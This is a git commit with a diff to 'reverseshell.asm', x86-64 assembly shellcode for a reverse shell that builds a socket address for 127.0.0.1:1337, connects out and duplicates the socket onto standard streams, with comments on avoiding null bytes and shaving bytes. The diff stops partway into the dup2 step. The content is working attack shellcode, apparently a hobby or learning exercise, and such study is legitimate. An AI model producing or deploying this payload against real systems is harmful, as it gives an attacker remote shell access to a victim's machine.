7a004512f5c090b4578554ac7abba13c175db4d4
Dion Bosschieter <dbosschieter@transip.nl>
2024-09-16 16:45:13 +0200

    revershell: Set ip struc on stack before zero stack to save some pops

--- reverseshell.asm
+++ reverseshell.asm
@@ -7,35 +7,35 @@ _start:
     push rax ; push pop instead of mov rcx, rax (shorter)
     pop rcx
 
-_cleanstack:
-    push rdx
-    loop _cleanstack ; idk how many times :p, we'll have to get lucky that rcx is populated
+_setupipstructforconnect:
+    mov rbx, 0x0100007f39050002 ; 127.0.0.1:1337 AF_INET
+    push rbx ; use rbx here, because we overwrite it afterwards, so we save a xor to clear it
+    push rsp ; push and pop is smaller than mov rsi, rsp
+    pop rsi ; point rsi already towards the ip struct for the connection function, this saves us a remove of the ip data later before the execve because we need a 0 byte after bin/sh
 
-    pop rbx ; clear rbx with our zero data from the
+_pushzerostostack:
+    push rdx ; zero stack so we can use it to clear registers
+    loop _pushzerostostack ; loop until rcx is 0
+
+    pop rbx ; clear rbx with our zero data from above
 _socket:
     ; we use the bl,cl,dl registers instead of rbx rcx rdx registers because
     ; they result in extra 0 bytes in the shell code
     mov bl, 2 ; AF_INET
     mov cl, 1 ; SOCK_STREAM
-    mov dl, 6 ; IPPROTO_TCP
+    ; mov dl, 6 ; IPPROTO_TCP
     mov ax, 359; sys_socket
     int 0x80 ; syscall
     push rax ; save file descriptor to rdi because connect() expects it there, we can also use rdi in dup2
     pop rdi ; push and pop is smaller than mov rdi, rax
 
 _connect:
-    mov rbx, 0x0100007f39050002 ; 127.0.0.1:1337 AF_INET
-    push rbx ; use rbx here, because we overwrite it afterwards, so we save a xor to clear it
     mov al, 42 ; connect
-    ; rdi is normally set, but we've already set it it in _socket
-
-    push rsp ; push and pop is smaller than mov rsi, rsp
-    pop rsi
-
+    ; rdi is normally set, but we've already set it in _socket
+    ; rsi is normally set, but we've already set it in _setupipstructforconnect
     mov dl, 0x10
     syscall
 
-    pop rcx ; remove ip data from stack, so that we have our zero bytes for after /bin/sh
     pop rcx ; clear rcx with zero data on stack
 _dup2:
     push rdi ; push and pop is smaller than mov rbx, rdi ; restore saved filedescriptor
